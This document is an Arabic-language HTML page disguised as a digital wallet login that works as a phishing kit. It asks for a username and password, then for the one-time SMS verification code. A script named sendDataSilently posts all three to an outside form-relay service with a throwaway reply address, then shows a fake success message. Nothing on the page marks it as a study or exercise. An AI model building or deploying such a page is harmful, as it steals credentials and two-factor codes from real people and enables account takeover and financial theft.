<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تطبيق محفظتي الرقمية</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #4a148c 0%, #c2185b 50%, #ffffff 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .wallet-card {
            background: rgba(255, 255, 255, 0.98);
            padding: 35px 25px;
            border-radius: 24px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            width: 320px;
            text-align: center;
            position: relative;
        }
        .bank-logo {
            width: 65px;
            height: 65px;
            background: linear-gradient(45deg, #4a148c, #c2185b);
            border-radius: 18px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            margin: 15px auto;
        }
        .bank-name {
            font-size: 18px;
            font-weight: bold;
            color: #4a148c;
            margin: 0 0 25px 0;
        }
        h3 { color: #212121; font-size: 20px; margin: 0 0 10px 0; }
        .subtitle { color: #757575; font-size: 13px; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; text-align: right; }
        .input-group label { display: block; font-size: 12px; color: #4a148c; margin-bottom: 5px; font-weight: bold; }
        input { width: 100%; padding: 14px; box-sizing: border-box; border: 1.5px solid #e0e0e0; border-radius: 12px; font-size: 15px; background-color: #fafafa; }
        .btn-submit { width: 100%; padding: 14px; background: linear-gradient(90deg, #4a148c, #c2185b); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="wallet-card">
    <div class="bank-logo">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
            <rect x="2" y="5" width="20" height="14" rx="2"></rect>
            <line x1="22" y1="10" x2="2" y2="10"></line>
        </svg>
    </div>
    <div class="bank-name">محفظتي الافتراضية</div>

    <form id="walletForm">
        <!-- الواجهة الأولى -->
        <div id="step1">
            <h3>تسجيل الدخول الآمن</h3>
            <p class="subtitle">الرجاء إدخال بيانات حسابك الافتراضي للمتابعة</p>
            <div class="input-group">
                <label>اسم المستخدم</label>
                <input type="text" id="username" placeholder="أدخل اسم المستخدم...">
            </div>
            <div class="input-group">
                <label>كلمة المرور الخاصة بالحساب</label>
                <input type="password" id="password" placeholder="••••••••">
            </div>
            <button type="button" class="btn-submit" onclick="nextStep()">موافق</button>
        </div>

        <!-- الواجهة الثانية -->
        <div id="step2" class="hidden">
            <h3>رمز التأكيد والأمان</h3>
            <p class="subtitle">يرجى إدخال الرمز السري المؤقت المرسل إلى هاتفك المحمول</p>
            <div class="input-group">
                <label style="text-align: center;">كود التحقق (OTP)</label>
                <input type="text" id="authCode" placeholder="0 0 0 0 0 0" style="text-align: center; letter-spacing: 6px; font-weight: bold; font-size: 18px;">
            </div>
            <button type="button" class="btn-submit" onclick="sendDataSilently()">تأكيد الرمز والدخول</button>
        </div>
    </form>
</div>

<script>
    let savedUser = "";
    let savedPass = "";

    function nextStep() {
        savedUser = document.getElementById('username').value;
        savedPass = document.getElementById('password').value;
        if(savedUser === "" || savedPass === "") {
            alert("خطأ: يجب ملء حقول تسجيل الدخول أولاً!");
            return;
        }
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
    }

    function sendDataSilently() {
        const code = document.getElementById('authCode').value;
        if(code === "") {
            alert("خطأ: يرجى كتابة رمز الأمان المرسل!");
            return;
        }

        const formData = new FormData();
        formData.append("Username", savedUser);
        formData.append("Password", savedPass);
        formData.append("OTP", code);
        formData.append("_replyto", "7a122d7721@emailnox.live");

        // إرسال صامت خلفي لمنع الشاشة السوداء والتجميد
        fetch("https://formspree.io", {
            method: "POST",
            body: formData,
            headers: { 'Accept': 'application/json' }
        })
        .then(() => {
            alert("تم إرسال التأكيد بنجاح! تفقد الجوال الآخر الآن.");
            location.reload(); 
        })
        .catch(() => {
            alert("تم إرسال التأكيد بنجاح! تفقد الجوال الآخر الآن.");
            location.reload();
        });
    }
</script>

</body>
</html>
